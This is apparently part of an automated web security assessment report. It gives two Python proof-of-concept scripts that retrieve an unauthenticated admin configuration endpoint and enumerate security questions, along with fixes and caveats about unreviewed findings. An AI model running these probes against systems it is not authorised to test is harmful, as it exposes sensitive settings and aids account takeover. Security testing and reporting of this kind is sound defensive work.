## Attack playbook

Reproduction scripts for confirmed findings only. Each has passed a static safety check and performs no destructive action.

### W-009 — reproduction

Accesses the admin configuration endpoint without authentication, exposing sensitive app settings.

```python
import sys
import requests

base = sys.argv[1]
url = base.rstrip('/') + '/rest/admin/application-configuration'
resp = requests.get(url, timeout=10)
print('Status:', resp.status_code)
if resp.status_code == 200 and len(resp.text) > 0:
    print('WEAKNESS REPRODUCED: Admin configuration retrieved')
    print(resp.text[:500])
else:
    print('Not vulnerable')

```

**Fix.** Restrict this endpoint to authorized admin users via proper authentication and authorization checks.

### W-010 — reproduction

Lists all security questions via the public API, which may aid attackers in guessing security answers.

```python
import sys
import requests

base = sys.argv[1]
url = base.rstrip('/') + '/api/SecurityQuestions'
resp = requests.get(url, timeout=10)
print('Status:', resp.status_code)
if resp.status_code == 200 and len(resp.json().get('data', [])) > 0:
    print('WEAKNESS REPRODUCED: Security questions enumerated')
    for q in resp.json()['data']:
        print(q)
else:
    print('Not vulnerable')

```

**Fix.** Require authentication and authorization for accessing security questions, or only expose them to the user during setup.

## Caveats and limitations

These bound how far the results above can be relied on.

- Produced by an autonomous pipeline with no human review. Findings should be validated by a security engineer before remediation is prioritised or the results are shared externally.
- API routes were extracted from client-side JavaScript. They are candidate routes the application references, not a verified inventory of its endpoints.
- 13 of 15 findings were not proven exploitable (W-002, W-003, W-011, W-014, W-012, W-005, W-006, W-007, …). They are hypotheses based on observed assets, not demonstrated vulnerabilities.
- 5 findings were never tested for exploitability (W-011, W-012, W-013, W-014, W-015). No claim is made about them either way.
- Absence of a finding is not evidence of absence. This engagement covered what the crawler reached within its configured bounds.
